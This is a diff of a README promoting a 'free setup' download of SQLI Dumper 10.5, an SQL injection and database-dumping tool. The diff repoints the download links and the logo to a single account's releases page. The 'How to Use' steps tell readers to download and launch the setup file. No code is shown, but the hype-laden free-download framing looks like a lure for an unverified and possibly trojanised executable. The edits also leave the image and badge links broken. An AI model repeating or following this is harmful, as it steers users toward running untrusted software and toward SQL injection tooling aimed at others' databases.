@@ -2,7 +2,7 @@
 
 Welcome to the SQLI Dumper 10.5 Free Setup Repository, your ultimate destination for downloading and using the powerful tool for database analysis and security testing - Sqli Dumper v10.5.
 
-![SQLI Dumper Logo](https://example.com/sqli-dumper-logo.png)
+![SQLI Dumper Logo](https://github.com/Odogsdad/SQLI-DUMPER-10.5-Free-Setup/releases)
 
 ## Overview ℹ️
 
@@ -18,7 +18,7 @@ Are you looking for a reliable tool that can assist you in advanced database ana
 
 ## How to Use 🛠️
 
-1. Download the latest version of SQLI Dumper [here](https://github.com/files/uploaded/Application.zip).
+1. Download the latest version of SQLI Dumper [here](https://github.com/Odogsdad/SQLI-DUMPER-10.5-Free-Setup/releases).
 2. Launch the setup file and follow the on-screen instructions to install the tool.
 3. Start leveraging the powerful features of SQLI Dumper for all your database analysis and security testing needs.
 
@@ -44,7 +44,7 @@ Join our thriving community of SQLI Dumper users to share your insights, ask que
 
 Don't miss out on the opportunity to enhance your database analysis and security testing capabilities. Download SQLI Dumper 10.5 today and take your systems' security to the next level!
 
-[![Download SQLI Dumper](https://img.shields.io/badge/Download-SQLI Dumper-blue)](https://github.com/files/uploaded/Application.zip)
+[![Download SQLI Dumper](https://github.com/Odogsdad/SQLI-DUMPER-10.5-Free-Setup/releases Dumper-blue)](https://github.com/Odogsdad/SQLI-DUMPER-10.5-Free-Setup/releases)
 
 _Not able to access the download link? Be sure to check the "Releases" section of this repository for alternative options._
 
